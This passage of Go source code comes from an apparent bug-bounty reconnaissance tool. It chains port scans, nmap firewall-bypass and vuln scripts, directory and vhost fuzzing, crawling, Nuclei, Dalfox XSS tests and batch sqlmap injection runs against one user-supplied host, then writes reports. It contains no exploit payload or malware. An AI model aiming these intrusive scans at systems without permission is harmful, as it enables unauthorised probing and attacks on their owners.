    fmt.Printf("%s  ✓ %sResolved %s%s%s → %s%s%s\n", bcolors.Green, bcolors.BrightWhite, bcolors.BrightYellow, utils.RHost, bcolors.BrightWhite, bcolors.BrightGreen, targetIP, bcolors.Endc)

    ioutil.WriteFile(filepath.Join(portsDir, fmt.Sprintf("resolved_ip_%s.txt", utils.RHost)), []byte(targetIP), 0644)

    fmt.Printf("\n%s[%sFAST%s] %sFast Port Scanning (Top 1000)%s\n", bcolors.Cyan, bcolors.BrightYellow, bcolors.Cyan, bcolors.BrightWhite, bcolors.Endc)

    fmt.Printf("%s  → %sNaabu (top 1000 ports) ...%s\n", bcolors.Blue, bcolors.BrightWhite, bcolors.Endc)
    subprocess.Run("naabu -host %s -top-ports 1000 -silent -json -o %s/ports/naabu_%s.json", utils.RHost, ReconDir, utils.RHost)
    fmt.Printf(" %s✓%s\n", bcolors.Green, bcolors.Endc)

    fmt.Printf("%s[%sDEEP%s] %sDeep Port Scanning (All Ports)%s\n", bcolors.Cyan, bcolors.BrightYellow, bcolors.Cyan, bcolors.BrightWhite, bcolors.Endc)

    fmt.Printf("%s  → %sNmap comprehensive scan ...\n%s", bcolors.Blue, bcolors.BrightWhite, bcolors.Endc)
    subprocess.Run("nmap -sC -sV -p- -T4 -oA %s/ports/nmap_%s %s", ReconDir, utils.RHost, targetIP)
    fmt.Printf(" %s✓%s\n", bcolors.Green, bcolors.Endc)

    fmt.Printf("%s  → %sNmap firewall bypass ...%s\n", bcolors.Blue, bcolors.BrightWhite, bcolors.Endc)
    subprocess.Run("nmap --script firewall-bypass -v -sV -oN %s/ports/nmap_bypass_%s.txt %s", ReconDir, utils.RHost, targetIP)
    fmt.Printf(" %s✓%s\n", bcolors.Green, bcolors.Endc)

    fmt.Printf("%s  → %sNmap common ports scan ...%s\n", bcolors.Blue, bcolors.BrightWhite, bcolors.Endc)
    subprocess.Run("nmap -sS -p 80,443,8080,8443,22,21,25,53,3306,5432,6379,27017 -O -oN %s/ports/nmap_common_%s.txt %s", ReconDir, utils.RHost, targetIP)
    fmt.Printf(" %s✓%s\n", bcolors.Green, bcolors.Endc)

    fmt.Printf("\n%s[%sUDP%s] %sUDP Port Scanning%s\n", bcolors.Cyan, bcolors.BrightYellow, bcolors.Cyan, bcolors.BrightWhite, bcolors.Endc)

    fmt.Printf("%s  → %sNmap UDP common ports ...%s\n", bcolors.Blue, bcolors.BrightWhite, bcolors.Endc)
    subprocess.Run("nmap -sU -p 53,67,68,69,123,135,137,138,139,161,162,445,514,520,631,1434,1900,4500,49152 -oN %s/ports/nmap_udp_%s.txt %s", ReconDir, utils.RHost, targetIP)
    fmt.Printf(" %s✓%s\n", bcolors.Green, bcolors.Endc)

    fmt.Printf("\n%s[%sPN%s] %sNmap No-Ping Scan (for firewalled hosts)%s\n", bcolors.Cyan, bcolors.BrightYellow, bcolors.Cyan, bcolors.BrightWhite, bcolors.Endc)

    fmt.Printf("%s  → %sNmap -Pn scan ...%s\n", bcolors.Blue, bcolors.BrightWhite, bcolors.Endc)
    subprocess.Run("nmap -Pn -sV -p 80,443,8080,8443 -oN %s/ports/nmap_pn_%s.txt %s", ReconDir, utils.RHost, targetIP)
    fmt.Printf(" %s✓%s\n", bcolors.Green, bcolors.Endc)

    fmt.Printf("\n%s[%sPARSE%s] %sParsing Naabu Results for Targeted Nmap%s\n",bcolors.Cyan, bcolors.BrightYellow, bcolors.Cyan, bcolors.BrightWhite, bcolors.Endc)

    naabuFile := filepath.Join(ReconDir, "ports", fmt.Sprintf("naabu_%s.json", utils.RHost))
    if utils.FileExists(naabuFile) {
        content, err := ioutil.ReadFile(naabuFile)
        if err == nil {
            var ports []string
            lines := strings.Split(string(content), "\n")
            for _, line := range lines {
                if line == "" {
                    continue
                }
                var data map[string]interface{}
                if err := json.Unmarshal([]byte(line), &data); err == nil {
                    if port, ok := data["port"].(float64); ok {
                        ports = append(ports, fmt.Sprintf("%d", int(port)))
                    }
                }
            }
            
            if len(ports) > 0 {
                portList := strings.Join(ports, ",")
                fmt.Printf("%s  → %sTargeted Nmap on discovered ports ...%s\n", bcolors.Blue, bcolors.BrightWhite, bcolors.Endc)
                subprocess.Run("nmap -sC -sV -p %s -oN %s/ports/nmap_targeted_%s.txt %s", portList, ReconDir, utils.RHost, targetIP)
                fmt.Printf(" %s✓%s\n", bcolors.Green, bcolors.Endc)
            }
        }
    }
}

func TechScan(RHost, ReconDir string) {
    if utils.RHost == "" {
        fmt.Printf("\n%s[!] %sFailed to validate RHOST: Use %s'help' %sfor details.\n", 
            bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }

    fmt.Printf("\n%s[*] %sStarting TECHNOLOGY DETECTION PHASE ...%s\n", bcolors.Green, bcolors.BrightWhite, bcolors.Endc)

    techDir := filepath.Join(ReconDir, "tech")
    os.MkdirAll(techDir, os.ModePerm)
    screenshotsDir := filepath.Join(ReconDir, "screenshots")
    os.MkdirAll(screenshotsDir, os.ModePerm)

    subdomainsFile := filepath.Join(ReconDir, "subdomains", fmt.Sprintf("all_subdomains_%s.txt", utils.RHost))
 
    fmt.Printf("\n%s[%sPROBE%s] %sWeb Probing & Technology Detection%s\n", bcolors.Cyan, bcolors.BrightYellow, bcolors.Cyan, bcolors.BrightWhite, bcolors.Endc)

    fmt.Printf("%s  → %sHTTPX (tech detection) ...%s\n", bcolors.Blue, bcolors.BrightWhite, bcolors.Endc)
    subprocess.Run("%s/httpx -u %s -title -status-code -tech-detect -follow-redirects -silent -o %s/tech/httpx_%s.txt", utils.GoBin, utils.RHost, ReconDir, utils.RHost)
    fmt.Printf(" %s✓%s\n", bcolors.Green, bcolors.Endc)

    if utils.FileExists(subdomainsFile) {
        fmt.Printf("%s  → %sHTTPX (all subdomains) ...%s\n", bcolors.Blue, bcolors.BrightWhite, bcolors.Endc)
        subprocess.Run("%s/httpx -l %s -title -status-code -tech-detect -follow-redirects -silent -o %s/tech/httpx_all_%s.txt", utils.GoBin, subdomainsFile, ReconDir, utils.RHost)
        fmt.Printf(" %s✓%s\n", bcolors.Green, bcolors.Endc)
    }

    SortHttpx(RHost, ReconDir)

    fmt.Printf("\n%s[%sDEEP%s] %sDeep Technology Detection%s\n", bcolors.Cyan, bcolors.BrightYellow, bcolors.Cyan, bcolors.BrightWhite, bcolors.Endc)

    if _, err := exec.LookPath("whatweb"); err == nil {
        fmt.Printf("%s  → %sWhatWeb ...%s\n", bcolors.Blue, bcolors.BrightWhite, bcolors.Endc)
        subprocess.Run("whatweb -a 3 -o %s/tech/whatweb_%s.txt %s", ReconDir, utils.RHost, utils.RHost)
        fmt.Printf(" %s✓%s\n", bcolors.Green, bcolors.Endc)
    }

    fmt.Printf("\n%s[%sVISUAL%s] %sVisual Evidence%s\n", bcolors.Cyan, bcolors.BrightYellow, bcolors.Cyan, bcolors.BrightWhite, bcolors.Endc)

    if _, err := exec.LookPath("aquatone"); err == nil {
        fmt.Printf("%s  → %sAquatone screenshots ...%s\n", bcolors.Blue, bcolors.BrightWhite, bcolors.Endc)
        subprocess.Run("aquatone -out %s/screenshots/aquatone_%s -d %s", ReconDir, utils.RHost, utils.RHost)
        fmt.Printf(" %s✓%s\n", bcolors.Green, bcolors.Endc)
    }

    if _, err := exec.LookPath("gowitness"); err == nil {
        fmt.Printf("%s  → %sGowitness ...%s\n", bcolors.Blue, bcolors.BrightWhite, bcolors.Endc)
        subprocess.Run("gowitness single -s %s -o %s/screenshots/gowitness_%s", utils.RHost, ReconDir, utils.RHost)
        fmt.Printf(" %s✓%s\n", bcolors.Green, bcolors.Endc)
    }

    fmt.Printf("\n%s[%sRESPONSE%s] %sResponse Analysis%s\n", bcolors.Cyan, bcolors.BrightYellow, bcolors.Cyan, bcolors.BrightWhite, bcolors.Endc)

    if _, err := exec.LookPath("httprobe"); err == nil {
        fmt.Printf("%s  → %sHttprobe...%s", bcolors.Blue, bcolors.BrightWhite, bcolors.Endc)
        subprocess.Run("httprobe -l %s -o %s/tech/httprobe_%s.txt", subdomainsFile, ReconDir, utils.RHost)
        fmt.Printf(" %s✓%s\n", bcolors.Green, bcolors.Endc)
    }
}

func FuzzScan(RHost, ReconDir string) {
    if utils.RHost == "" {
        fmt.Printf("\n%s[!] %sFailed to validate RHOST: Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }

    fmt.Printf("\n%s[*] %sStarting FUZZING PHASE ...%s\n", bcolors.Green, bcolors.BrightWhite, bcolors.Endc)

    fuzzDir := filepath.Join(ReconDir, "fuzzing")
    os.MkdirAll(fuzzDir, os.ModePerm)

    fmt.Printf("\n%s[%sDIRS%s] %sDirectory Fuzzing%s\n", bcolors.Cyan, bcolors.BrightYellow, bcolors.Cyan, bcolors.BrightWhite, bcolors.Endc)

    fmt.Printf("%s  → %sGobuster (directory) ...%s\n", bcolors.Blue, bcolors.BrightWhite, bcolors.Endc)
    subprocess.Run("gobuster dir -u %s -w %s -x 7z,zip,tar,gz,bz2,sql,bak,backup,old,db,json,xml,conf,config,asp,aspx,php,jsp,txt,html -t 50 -k -o %s/fuzzing/gobuster_dir_%s.txt", utils.RHost, utils.WordsList, ReconDir, utils.RHost)
    fmt.Printf(" %s✓%s\n", bcolors.Green, bcolors.Endc)

    fmt.Printf("\n%s[%sVHOST%s] %sVirtual Host Fuzzing%s\n", bcolors.Cyan, bcolors.BrightYellow, bcolors.Cyan, bcolors.BrightWhite, bcolors.Endc)

    fmt.Printf("%s  → %sGobuster (vhost) ...%s\n", bcolors.Blue, bcolors.BrightWhite, bcolors.Endc)
    subprocess.Run("gobuster vhost -u %s -w %s -t 50 -o %s/fuzzing/gobuster_vhost_%s.txt", utils.RHost, utils.WordsList, ReconDir, utils.RHost)
    fmt.Printf(" %s✓%s\n", bcolors.Green, bcolors.Endc)

    fmt.Printf("\n%s[%sPARAMS%s] %sParameter Fuzzing%s\n", bcolors.Cyan, bcolors.BrightYellow, bcolors.Cyan, bcolors.BrightWhite, bcolors.Endc)

    fmt.Printf("%s  → %sFFUF (parameters)...%s", bcolors.Blue, bcolors.BrightWhite, bcolors.Endc)
    subprocess.Run("ffuf -u %s/FUZZ -w %s -mc 200,301,302,403 -fc 404 -o %s/fuzzing/ffuf_params_%s.json", utils.RHost, utils.WordsList, ReconDir, utils.RHost)
    fmt.Printf(" %s✓%s\n", bcolors.Green, bcolors.Endc)
}

func AsetScan(RHost, ReconDir string) {
    if utils.RHost == "" {
        fmt.Printf("\n%s[!] %sFailed to validate RHOST: Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }

    fmt.Printf("\n%s[*] %sStarting ASSET DISCOVERY PHASE ...%s\n", bcolors.Green, bcolors.BrightWhite, bcolors.Endc)

    assetsDir := filepath.Join(ReconDir, "assets")
    os.MkdirAll(assetsDir, os.ModePerm)

    fmt.Printf("\n%s[%sURLS%s] %sURL Discovery%s\n", bcolors.Cyan, bcolors.BrightYellow, bcolors.Cyan, bcolors.BrightWhite, bcolors.Endc)

    fmt.Printf("%s  → %sWayback Machine URLs...%s", bcolors.Blue, bcolors.BrightWhite, bcolors.Endc)
    subprocess.Run("waybackurls %s > %s/assets/waybackurls_%s.txt", utils.RHost, ReconDir, utils.RHost)
    fmt.Printf(" %s✓%s\n", bcolors.Green, bcolors.Endc)

    fmt.Printf("%s  → %sGAU (Get All URLs) ...%s\n", bcolors.Blue, bcolors.BrightWhite, bcolors.Endc)
    subprocess.Run("gau --subs %s > %s/assets/gau_%s.txt", utils.RHost, ReconDir, utils.RHost)
    fmt.Printf(" %s✓%s\n", bcolors.Green, bcolors.Endc)

    fmt.Printf("\n%s[%sCRAWL%s] %sWeb Crawling%s\n", bcolors.Cyan, bcolors.BrightYellow, bcolors.Cyan, bcolors.BrightWhite, bcolors.Endc)

    fmt.Printf("%s  → %sGospider ...%s\n", bcolors.Blue, bcolors.BrightWhite, bcolors.Endc)
    subprocess.Run("gospider -s %s -o %s/assets/gospider_%s -c 10 -d 5 -t 50 --blacklist jpg,jpeg,gif,png,svg,ico", utils.RHost, ReconDir, utils.RHost)
    fmt.Printf(" %s✓%s\n", bcolors.Green, bcolors.Endc)

    fmt.Printf("%s  → %sURLFinder ...%s\n", bcolors.Blue, bcolors.BrightWhite, bcolors.Endc)
    subprocess.Run("urlfinder -l %s -o %s/assets/urlfinder_%s.txt", utils.RHost, ReconDir, utils.RHost)
    fmt.Printf(" %s✓%s\n", bcolors.Green, bcolors.Endc)

    fmt.Printf("\n%s[%sKATANA%s] %sKatana Deep Crawling%s\n", bcolors.Cyan, bcolors.BrightYellow, bcolors.Cyan, bcolors.BrightWhite, bcolors.Endc)

    fmt.Printf("%s  → %sKatana ...%s\n", bcolors.Blue, bcolors.BrightWhite, bcolors.Endc)
    sortedHttpx := filepath.Join(ReconDir, "tech", fmt.Sprintf("sorted_httpx_%s.txt", utils.RHost))
    subprocess.Run("katana -list %s -kf all -d 45 -r 1.1.1.1 -silent -o %s/assets/katana_%s.txt", sortedHttpx, ReconDir, utils.RHost)
    fmt.Printf(" %s✓%s\n", bcolors.Green, bcolors.Endc)

    fmt.Printf("\n%s[%sCOMBINE%s] %sCombining Assets%s\n", bcolors.Cyan, bcolors.BrightYellow, bcolors.Cyan, bcolors.BrightWhite, bcolors.Endc)

    CombineAssets(RHost, ReconDir)
}

func LeakScan(RHost, ReconDir string) {
    if utils.RHost == "" {
        fmt.Printf("\n%s[!] %sFailed to validate RHOST: Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }

    fmt.Printf("\n%s[*] %sStarting LEAK DETECTION PHASE ...%s\n", bcolors.Green, bcolors.BrightWhite, bcolors.Endc)

    leaksDir := filepath.Join(ReconDir, "leaks")
    os.MkdirAll(leaksDir, os.ModePerm)

    fmt.Printf("\n%s[%sSECRETS%s] %sSecret Detection%s\n", bcolors.Cyan, bcolors.BrightYellow, bcolors.Cyan, bcolors.BrightWhite, bcolors.Endc)

    fmt.Printf("%s  → %sGitleaks ...%s\n", bcolors.Blue, bcolors.BrightWhite, bcolors.Endc)
    subprocess.Run("gitleaks detect -v --source . --report-path %s/leaks/gitleaks_%s.json", ReconDir, utils.RHost)
    fmt.Printf(" %s✓%s\n", bcolors.Green, bcolors.Endc)

    fmt.Printf("%s  → %sTruffleHog ...%s\n", bcolors.Blue, bcolors.BrightWhite, bcolors.Endc)
    subprocess.Run("trufflehog filesystem --no-update --json --directory . --output %s/leaks/trufflehog_%s.json", ReconDir, utils.RHost)
    fmt.Printf(" %s✓%s\n", bcolors.Green, bcolors.Endc)

    fmt.Printf("\n%s[%sCODE%s] %sCode Analysis%s\n", bcolors.Cyan, bcolors.BrightYellow, bcolors.Cyan, bcolors.BrightWhite, bcolors.Endc)

    fmt.Printf("%s  → %sSemgrep ...%s\n", bcolors.Blue, bcolors.BrightWhite, bcolors.Endc)
    subprocess.Run("semgrep -l --output %s/leaks/semgrep_%s.json", ReconDir, utils.RHost)
    fmt.Printf(" %s✓%s\n", bcolors.Green, bcolors.Endc)
}

func VulnScan(RHost, ReconDir string) {
    if utils.RHost == "" {
        fmt.Printf("\n%s[!] %sFailed to validate RHOST: Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }

    fmt.Printf("\n%s[*] %sStarting VULNERABILITY ASSESSMENT PHASE ...%s\n", bcolors.Green, bcolors.BrightWhite, bcolors.Endc)

    vulnDir := filepath.Join(ReconDir, "vulnerabilities")
    techDir := filepath.Join(ReconDir, "tech")
    portsDir := filepath.Join(ReconDir, "ports")

    os.MkdirAll(vulnDir, os.ModePerm)
    os.MkdirAll(techDir, os.ModePerm)
    os.MkdirAll(portsDir, os.ModePerm)

    ips, err := net.LookupHost(utils.RHost)
    if err != nil {
        fmt.Printf("%s[!] %sFailed to resolve host: %v%s\n", bcolors.Red, bcolors.BrightWhite, err, bcolors.Endc)
        return
    }
    targetIP := ips[0]
    fmt.Printf("%s  ✓ %sResolved %s%s%s → %s%s%s\n", bcolors.Green, bcolors.BrightWhite, bcolors.BrightYellow, utils.RHost, bcolors.BrightWhite, bcolors.BrightGreen, targetIP, bcolors.Endc)

    sortedHttpxOutput := filepath.Join(ReconDir, "tech", fmt.Sprintf("sorted_httpx_%s.txt", utils.RHost))
    httpxOutput := filepath.Join(ReconDir, "tech", fmt.Sprintf("httpx_%s.txt", utils.RHost))
    
    if !utils.FileExists(sortedHttpxOutput) {
        fmt.Printf("%s  ⚠ %sHTTPX output not found, generating ...%s\n", bcolors.Yellow, bcolors.BrightWhite, bcolors.Endc)
        subprocess.Run("%s/httpx -u %s -title -status-code -tech-detect -follow-redirects -silent -o %s", utils.GoBin, utils.RHost, httpxOutput)

        subdomainsFile := filepath.Join(ReconDir, "subdomains", fmt.Sprintf("all_subdomains_%s.txt", utils.RHost))
        if utils.FileExists(subdomainsFile) {
            subprocess.Run("%s/httpx -l %s -title -status-code -tech-detect -follow-redirects -silent -o %s/tech/httpx_all_%s.txt", utils.GoBin, subdomainsFile, ReconDir, utils.RHost)
        }

        SortHttpx(RHost, ReconDir)
    }

    fmt.Printf("\n%s[%sNUCLEI%s] %sNuclei Vulnerability Scanning%s\n", bcolors.Cyan, bcolors.BrightYellow, bcolors.Cyan, bcolors.BrightWhite, bcolors.Endc)
    if _, err := exec.LookPath("nuclei"); err == nil {
        fmt.Printf("%s  → %sNuclei (Automation) ...%s\n", bcolors.Blue, bcolors.BrightWhite, bcolors.Endc)
        subprocess.Run("nuclei -u %s -o %s/nuclei_medium_%s.txt", utils.RHost, vulnDir, utils.RHost)
        fmt.Printf(" %s✓%s\n", bcolors.Green, bcolors.Endc)

        if utils.FileExists(sortedHttpxOutput) {
            fmt.Printf("%s  → %sNuclei (all templates) ...%s\n", bcolors.Blue, bcolors.BrightWhite, bcolors.Endc)
            subprocess.Run("nuclei -l %s -silent -o %s/nuclei_all_%s.txt", sortedHttpxOutput, vulnDir, utils.RHost)
            fmt.Printf(" %s✓%s\n", bcolors.Green, bcolors.Endc)
        }

    } else {
        fmt.Printf("%s  ✗ %sNuclei not installed, skipping ...%s\n", bcolors.Red, bcolors.BrightWhite, bcolors.Endc)
    }

    fmt.Printf("\n%s[%sPORTS%s] %sPort Scanning (Nmap) ...%s\n", bcolors.Cyan, bcolors.BrightYellow, bcolors.Cyan, bcolors.BrightWhite, bcolors.Endc)
    if _, err := exec.LookPath("nmap"); err == nil {
        fmt.Printf("%s  → %sNmap vuln scripts ...%s\n",  bcolors.Blue, bcolors.BrightWhite, bcolors.Endc)
        subprocess.Run("nmap -sV -p 80,443,8080,8443 --script vuln -oN %s/nmap_vuln_%s.txt %s", portsDir, utils.RHost, targetIP)
        fmt.Printf(" %s✓%s\n", bcolors.Green, bcolors.Endc)

        fmt.Printf("%s  → %sNmap full vuln scan ...%s\n", bcolors.Blue, bcolors.BrightWhite, bcolors.Endc)
        subprocess.Run("nmap -sC -sV -p- --script vuln -T4 -oN %s/nmap_full_vuln_%s.txt %s", portsDir, utils.RHost, targetIP)
        fmt.Printf(" %s✓%s\n", bcolors.Green, bcolors.Endc)

        fmt.Printf("%s  → %sNmap aggressive vuln scan ...%s\n", bcolors.Blue, bcolors.BrightWhite, bcolors.Endc)
        subprocess.Run("nmap -sV -p 80,443,8080,8443,22,21,25,53,3306,5432,6379 --script vuln --script-args vulns.showall -oN %s/nmap_aggressive_vuln_%s.txt %s", portsDir, utils.RHost, targetIP)
        fmt.Printf(" %s✓%s\n", bcolors.Green, bcolors.Endc)

    } else {
        fmt.Printf("%s  ✗ %sNmap not installed, skipping ...%s\n", bcolors.Red, bcolors.BrightWhite, bcolors.Endc)
    }

    fmt.Printf("\n%s[%sXSS%s] %sXSS Detection%s\n", bcolors.Cyan, bcolors.BrightYellow, bcolors.Cyan, bcolors.BrightWhite, bcolors.Endc)
    if _, err := exec.LookPath("dalfox"); err == nil {
        katanaOutput := filepath.Join(ReconDir, "assets", fmt.Sprintf("katana_%s.txt", utils.RHost))

        if utils.FileExists(katanaOutput) {
            fmt.Printf("%s  → %sDalfox XSS (with katana output) ...%s\n",  bcolors.Blue, bcolors.BrightWhite, bcolors.Endc)
            subprocess.Run("dalfox file --only-poc r --ignore-return 302,404,403 --skip-bav %s -o %s/dalfox_%s.txt", katanaOutput, vulnDir, utils.RHost)
            fmt.Printf(" %s✓%s\n", bcolors.Green, bcolors.Endc)
        } else {
            fmt.Printf("%s  → %sDalfox XSS (direct) ...%s\n", bcolors.Blue, bcolors.BrightWhite, bcolors.Endc)
            subprocess.Run("dalfox scan %s --only-poc r --ignore-return 302,404,403 -o %s/dalfox_%s.txt", utils.RHost, vulnDir, utils.RHost)
            fmt.Printf(" %s✓%s\n", bcolors.Green, bcolors.Endc)
        }
    } else {
        fmt.Printf("%s  ✗ %sDalfox not installed, skipping ...%s\n", bcolors.Red, bcolors.BrightWhite, bcolors.Endc)
    }

    fmt.Printf("\n%s[%sSQL%s] %sSQL Injection Detection%s\n", bcolors.Cyan, bcolors.BrightYellow, bcolors.Cyan, bcolors.BrightWhite, bcolors.Endc)
    if _, err := exec.LookPath("sqlmap"); err == nil {
        allUrls := filepath.Join(ReconDir, "assets", fmt.Sprintf("all_urls_%s.txt", utils.RHost))

        if utils.FileExists(allUrls) {
            fmt.Printf("%s  → %sSQLMap (batch mode) ...%s\n", bcolors.Blue, bcolors.BrightWhite, bcolors.Endc)
            subprocess.Run("sqlmap -m %s --batch --random-agent --level=3 --risk=2 --output-dir=%s/sqlmap_%s", allUrls, vulnDir, utils.RHost)
            fmt.Printf(" %s✓%s\n", bcolors.Green, bcolors.Endc)
        } else {
            fmt.Printf("%s  → %sSQLMap (single URL) ...%s\n", bcolors.Blue, bcolors.BrightWhite, bcolors.Endc)
            subprocess.Run("sqlmap -u %s --batch --random-agent --level=3 --risk=2 --output-dir=%s/sqlmap_%s", utils.RHost, vulnDir, utils.RHost)
            fmt.Printf(" %s✓%s\n", bcolors.Green, bcolors.Endc)
        }
    } else {
        fmt.Printf("%s  ✗ %sSQLMap not installed, skipping ...%s\n", bcolors.Red, bcolors.BrightWhite, bcolors.Endc)
    }

    fmt.Printf("\n%s[%sSUMMARY%s] %sGenerating Vulnerability Summary%s\n", bcolors.Cyan, bcolors.BrightYellow, bcolors.Cyan, bcolors.BrightWhite, bcolors.Endc)
    generateVulnSummary(RHost, ReconDir)

    fmt.Printf("\n%s✓ %sVulnerability assessment complete!%s\n", bcolors.BrightGreen, bcolors.BrightWhite, bcolors.Endc)
    fmt.Printf("%s📁 %sResults saved to: %s%s%s\n", bcolors.Cyan, bcolors.BrightWhite, bcolors.BrightYellow, vulnDir, bcolors.Endc)
}

func generateVulnSummary(RHost, ReconDir string) {
    vulnDir := filepath.Join(ReconDir, "vulnerabilities")
    summaryFile := filepath.Join(vulnDir, fmt.Sprintf("VULNERABILITY_SUMMARY_%s.txt", utils.RHost))
    
    summary := fmt.Sprintf(`
🔐 VULNERABILITY ASSESSMENT SUMMARY
Target: %s
Date: %s
Directory: %s

📊 SCAN RESULTS
`, utils.RHost, time.Now().Format("2006-01-02 15:04:05"), vulnDir)

    files, err := ioutil.ReadDir(vulnDir)
    if err == nil {
        for _, file := range files {
            if !file.IsDir() {
                size := file.Size()
                summary += fmt.Sprintf("  • %-30s %8d bytes\n", file.Name(), size)
            }
        }
    }

    summary += `
🛠️ TOOLS USED
  • Nuclei - Vulnerability scanning (critical, high, medium, CVE, tech, misconfigs, default creds, exposures)
  • Nmap - Port scanning with vuln scripts
  • Dalfox - XSS detection
  • SQLMap - SQL injection detection

📝 NEXT STEPS
  1. Review critical vulnerabilities in nuclei_critical_*.txt
  2. Check CVE findings in cves_*.txt
  3. Review technology-specific vulns in tech_vulns_*.txt
  4. Check misconfigurations in misconfigs_*.txt
  5. Review default credentials findings
  6. Check XSS findings in dalfox_*.txt
  7. Review SQL injection results in sqlmap_*/
  8. Investigate nmap vuln script findings
  9. Prioritize vulnerabilities by severity

`
    ioutil.WriteFile(summaryFile, []byte(summary), 0644)
    fmt.Printf("%s  ✓ %sSummary saved to: %s%s%s\n", bcolors.Green, bcolors.BrightWhite, bcolors.BrightYellow, summaryFile, bcolors.Endc)
}

func AutoScan(RHost, ReconDir string) {
    if utils.RHost == "" {
        fmt.Printf("\n%s[!] %sFailed to validate RHOST: Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }

    fmt.Printf("\n%s[*] %sStarting COMPLETE BUG BOUNTY PIPELINE for %s%s%s ...%s\n", bcolors.Yellow, bcolors.BrightWhite, bcolors.BrightGreen, utils.RHost, bcolors.BrightWhite, bcolors.Endc)
    startTime := time.Now()

    fmt.Printf("%s PHASE 1: SUBDOMAIN ENUMERATION %s\n", bcolors.Cyan, bcolors.Endc)
    EnumScan(RHost, ReconDir)
    CombineSu(RHost, ReconDir)

    fmt.Printf("%s PHASE 2: DNS RECONNAISSANCE %s\n", bcolors.Cyan, bcolors.Endc)
    DnsRecon(RHost, ReconDir)

    fmt.Printf("%s PHASE 3: PORT SCANNING %s\n", bcolors.Cyan, bcolors.Endc)
    PortScan(RHost, ReconDir)

    fmt.Printf("%s PHASE 4: TECHNOLOGY DETECTION %s\n", bcolors.Cyan, bcolors.Endc)
    TechScan(RHost, ReconDir)

    fmt.Printf("%s PHASE 5: ASSET DISCOVERY %s\n", bcolors.Cyan, bcolors.Endc)
    AsetScan(RHost, ReconDir)

    fmt.Printf("%s PHASE 6: FUZZING %s\n", bcolors.Cyan, bcolors.Endc)
    FuzzScan(RHost, ReconDir)

    fmt.Printf("%s PHASE 7: LEAK DETECTION %s\n", bcolors.Cyan, bcolors.Endc)
    LeakScan(RHost, ReconDir)

    fmt.Printf("%s PHASE 8: VULNERABILITY SCANNING %s\n", bcolors.Cyan, bcolors.Endc)
    VulnScan(RHost, ReconDir)

    fmt.Printf("%s PHASE 9: INTRUSIVE SCANNING %s\n", bcolors.Cyan, bcolors.Endc)
    Intrusive(RHost, ReconDir)

    GenerateFinalReport(RHost, ReconDir, startTime)

    fmt.Printf("\n%s✓ %sWORKFLOW COMPLETE!%s\n", bcolors.BrightGreen, bcolors.BrightWhite, bcolors.Endc)
    fmt.Printf("%s📁 %sResults saved at: %s%s%s\n", bcolors.Cyan, bcolors.BrightWhite, bcolors.BrightGreen, ReconDir, bcolors.Endc)
}

func CombineAssets(RHost, ReconDir string) {
    assetsDir := filepath.Join(ReconDir, "assets")
    
    files := []string{
        filepath.Join(assetsDir, fmt.Sprintf("waybackurls_%s.txt", utils.RHost)),
        filepath.Join(assetsDir, fmt.Sprintf("gau_%s.txt", utils.RHost)),
        filepath.Join(assetsDir, fmt.Sprintf("urlfinder_%s.txt", utils.RHost)),
        filepath.Join(assetsDir, fmt.Sprintf("gospider_%s", utils.RHost)),
        filepath.Join(assetsDir, fmt.Sprintf("katana_%s.txt", utils.RHost)),
    }

    uniqueUrls := make(map[string]struct{})
    
    for _, file := range files {
        if utils.FileExists(file) {
            content, err := ioutil.ReadFile(file)
            if err == nil {
                for _, line := range strings.Split(string(content), "\n") {
                    line = strings.TrimSpace(line)
                    if line != "" && strings.HasPrefix(line, "http") {
                        uniqueUrls[line] = struct{}{}
                    }
                }
            }
        }
    }

    outputFile := filepath.Join(assetsDir, fmt.Sprintf("all_urls_%s.txt", utils.RHost))
    urls := make([]string, 0, len(uniqueUrls))
    for u := range uniqueUrls {
        urls = append(urls, u)
    }
    sort.Strings(urls)

    ioutil.WriteFile(outputFile, []byte(strings.Join(urls, "\n")), 0644)

    fmt.Printf("%s  ✓ %sTotal unique URLs: %s%d%s\n", bcolors.Green, bcolors.BrightWhite, bcolors.BrightYellow, len(urls), bcolors.Endc)
}

func GenerateFinalReport(RHost, ReconDir string, startTime time.Time) {
    reportsDir := filepath.Join(ReconDir, "reports")
    os.MkdirAll(reportsDir, os.ModePerm)

    reportFile := filepath.Join(reportsDir, fmt.Sprintf("FINAL_REPORT_%s.txt", utils.RHost))
    duration := time.Since(startTime)

    report := fmt.Sprintf(`
                   🔥 FINAL BUG BOUNTY REPORT 🔥

Target: %s
Date: %s
Duration: %s
                       📊 EXECUTION SUMMARY

`,
        utils.RHost, 
        time.Now().Format("2006-01-02 15:04:05"),
        duration.String())

    phases := []struct{
        name string
        dir string
    }{
        {"Subdomains", "subdomains"},
        {"DNS Records", "dns"},
        {"Ports", "ports"},
        {"Technologies", "tech"},
        {"Assets", "assets"},
        {"Fuzzing", "fuzzing"},
        {"Leaks", "leaks"},
        {"Vulnerabilities", "vulnerabilities"},
    }

    totalFindings := 0
    for _, phase := range phases {
        dirPath := filepath.Join(ReconDir, phase.dir)
        if utils.FileExists(dirPath) {
            files, _ := ioutil.ReadDir(dirPath)
            report += fmt.Sprintf("║ %-20s: %-5d files                                ║\n", 
                phase.name, len(files))
            totalFindings += len(files)
        } else {
            report += fmt.Sprintf("║ %-20s: %-5s                                     ║\n", 
                phase.name, "N/A")
        }
    }

    vulnDir := filepath.Join(ReconDir, "vulnerabilities")
    vulnCount := 0
    criticalCount := 0
    highCount := 0
    
    if utils.FileExists(vulnDir) {
        files, _ := ioutil.ReadDir(vulnDir)
        for _, file := range files {
            if strings.HasSuffix(file.Name(), ".json") || strings.HasSuffix(file.Name(), ".txt") {
                content, _ := ioutil.ReadFile(filepath.Join(vulnDir, file.Name()))
                lines := strings.Split(string(content), "\n")
                for _, line := range lines {
                    if strings.Contains(line, "critical") || strings.Contains(line, "\"severity\":\"critical\"") {
                        criticalCount++
                    }
